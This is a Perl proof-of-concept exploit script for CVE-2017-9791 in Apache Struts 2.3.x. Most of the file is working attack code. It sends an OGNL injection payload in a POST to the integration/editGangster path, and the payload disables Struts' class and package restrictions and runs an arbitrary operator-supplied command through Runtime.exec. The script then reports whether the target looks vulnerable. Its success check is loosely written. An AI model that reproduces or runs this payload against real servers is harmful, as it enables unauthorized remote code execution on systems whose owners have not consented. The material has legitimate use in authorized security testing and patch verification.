#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use Term::ANSIColor qw(colored color);
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;
use Getopt::Long;

# Display The Header
header();

# Run The PoC
exploit();


sub header {
    print "\n\n";
    my $title = "=================================[ CVE-2017-9791 ]=================================";
    
    print qq{
$title
            
   Reporter : Vex Woo
       Date : 2017-07-07
        CVE : CVE-2017-9791
            
Description :


The Struts 1 plugin in Apache Struts 2.3.x might allow remote code
execution via a malicious field value passed in a raw message to the
ActionMessage.


};
    print "="x(length($title)) . "\n\n";
}

sub exploit_header {
    system("clear");
    print color("red");
    print " ____     __  __  ____                 ___       __      _     ________          __      ________    __      _     \n";
    print "/\\  _`\\  /\\ \\/\\ \\/\\  _`\\             /'___`\\   /'__`\\  /' \\   /\\_____  \\       /'_ `\\   /\\_____  \\ /'_ `\\  /' \\    \n";
    print "\\ \\ \\/\\_\\\\ \\ \\ \\ \\ \\ \\L\\_\\          /\\_\\ /\\ \\ /\\ \\/\\ \\/\\_, \\  \\/___//'/'      /\\ \\L\\ \\  \\/___//'/'/\\ \\L\\ \\/\\_, \\   \n";
    print " \\ \\ \\/_/_\\ \\ \\ \\ \\ \\  _\\L   _______\\/_/// /__\\ \\ \\ \\ \\/_/\\ \\     /' /'_______\\ \\___, \\     /' /' \\ \\___, \\/_/\\ \\  \n";
    print "  \\ \\ \\L\\ \\\\ \\ \\_/ \\ \\ \\L\\ \\/\\______\\  // /_\\ \\\\ \\ \\_\\ \\ \\ \\ \\  /' /' /\\______\\\\/__,/\\ \\  /' /'    \\/__,/\\ \\ \\ \\ \\ \n";
    print "   \\ \\____/ \\ `\\___/\\ \\____/\\/______/ /\\______/ \\ \\____/  \\ \\_\\/\\_/   \\/______/     \\ \\_\\/\\_/           \\ \\_\\ \\ \\_\\\n";
    print "    \\/___/   `\\/__/  \\/___/           \\/_____/   \\/___/    \\/_/\\//                   \\/_/\\//             \\/_/  \\/_/\n";
    print "                                                                                                                   \n";
    print "                                                                                                                   \n";

    
    print color("green");
    print "\nGithub : https://github.com/gottburgm/\n";
    print "\n\n";
}

sub Help {
    print "\n";
    print qq {  
        # Usage
            perl $0 [ARGUMENTS]
        
        # Arguments


            --url [URL]     : The URL Of The Target
            --timeout [VALUE]     : The Timeout To Use For The HTTP Requests
            --help     : Display Help Menu
            --install-dir [INSTALL-DIR]     : The Apache Struts Installation Base Directory
            --port [PORT]     : The Web Server Port On Which Apache Struts Is Running
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my ( $useragent, $timeout, $proxy ) = @_;
    $proxy = 0 if(!defined($proxy));
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable(['GET', 'POST', 'HEAD', 'OPTIONS']);
    $browser->cookie_jar( $cookie_jar);
    
    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    
    if($proxy) {
        $browser->proxy( [qw( http https ftp ftps )] => $proxy);
    }
    
    return $browser;
}

sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $content_type = 'application/x-www-form-urlencoded' if(!defined($content_type));
    $payload = '' if(!defined($payload));
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $request = new HTTP::Request $method, $url . '?' . $payload;
    } else {
        $request = new HTTP::Request $method, $url;
        $request->content($payload);
    }
    $request->content_type($content_type);
    
    return $request;
}

sub exploit {
    my $browser = 0;
    my $request = 0;
    my $response = 0;
    my $proxy = 0;
    my $vulnerable = 1;
    my $useragent = "";
    

    my $install_dir = 0;	# Command Argument : install-dir
    my $port = 0;		# Command Argument : port
    my $timeout = 30;		# Command Argument : timeout
    my $url = 0;		# Command Argument : url
    my $cmd = "id";		# Command Argument : cmd

    ### Get Options/arguments
    GetOptions(
    	"install-dir=s"		=> \$install_dir,
    	"port=i"		=> \$port,
        "cmd=s"                 => \$cmd,
    	"help"		        => \&Help,
    	"timeout=i"		=> \$timeout,
    	"url=s"		        => \$url,
    ) or Help();    
    
    exploit_header();
    
    ### Setting Up The Requester
    $browser = buildRequester($useragent, $timeout, $proxy);
    
    ### Build/send the requests

  # Request : EXPLOIT1
  # Method : POST
  # Path : integration/editGangster
  # Payload : name=%{(#dm=\@ognl.OgnlContext\@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(\@com.opensymphony.xwork2.ognl.OgnlUtil\@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(\@java.lang.Runtime\@getRuntime().exec('$cmd'))}&age=20__checkbox_bustedBefore=true&description=1
  print color("white") . "[" . color("yellow") . "*" . color("white") . "]" . color("blue") . " Sending [POST] Request On : integration/editGangster
\n";
  print color("white") . "[" . color("yellow") . "*" . color("white") . "]" . color("white") . " Payload : " . color("green") . " \"name=%{(#dm=\@ognl.OgnlContext\@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(\@com.opensymphony.xwork2.ognl.OgnlUtil\@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(\@java.lang.Runtime\@getRuntime().exec('$cmd'))}&age=20__checkbox_bustedBefore=true&description=1\"\n";
  $request = buildRequest($url . "integration/editGangster", "POST", "name=%{(#dm=\@ognl.OgnlContext\@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(\@com.opensymphony.xwork2.ognl.OgnlUtil\@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(\@java.lang.Runtime\@getRuntime().exec('" . $cmd . "'))}&age=20&__checkbox_bustedBefore=true&description=1", "application/x-www-form-urlencoded");
  $request->headers("Referer" => "$url");
  $response = $browser->request($request);
  print color("white") . "   [" . color("yellow") . "R" . color("white") . "]" . color("blue") . " Response => " . color("green") . $request->uri . color("blue") . " ( Code : " . color("green") . $response->code . color("blue") . ")\n\n";

  $vulnerable = 0 if(!validate("TSTRING", "h3ll", $response));
    
    

    ### Validate or not the test
    if($vulnerable) {
        print color("white") . "[" . color("red") . "VULNERABLE" . color("white") . "] " . color("green") . $url . color("white") . " is affected or any kind of validation was provided.\n";
    } else {
        print color("white") . "[" . color("yellow") . "NOT VULNERABLE" . color("white") . "] " . color("green") . $url . color("white") . " is not affected.\n";
    }
    
}

sub validate {
    my ( $validation_mode, $validation_value, $response ) = @_;
    my $value = 0;
    my $positive = 1;
    my $type = substr($validation_mode, 1, length($validation_mode));
    
    $positive = 0 if(substr(uc($validation_mode), 0, 1) eq 'F');
    
    given(substr($validation_mode, 1, length($validation_mode))) {
        
        when(/CODE/i) { $value = $response->code; }
        
        when(/SIZE/i) { $value = length($response->content); }
        
        when(/STRING|REGEX/i) {  $value = $response->content; }
        
        when(/HEADER/i) {
            my @header_parts = split(':', $validation_value);
            
            if($header_parts[0]) {
                if($response->header($header_parts[0])) {
                    if($header_parts[1]) {
                        return $positive if($response->header($header_parts[0]) =~ $header_parts[1]);
                    } else {
                        return $positive;
                    }
                } else {
                    return 0;
                }
            } else {
                return 0;
            }
        }
    }
    
    if($validation_value && $validation_value =~ /$value/i || $validation_value eq $value) {
        return $positive;
    }
    
    return 0;
}
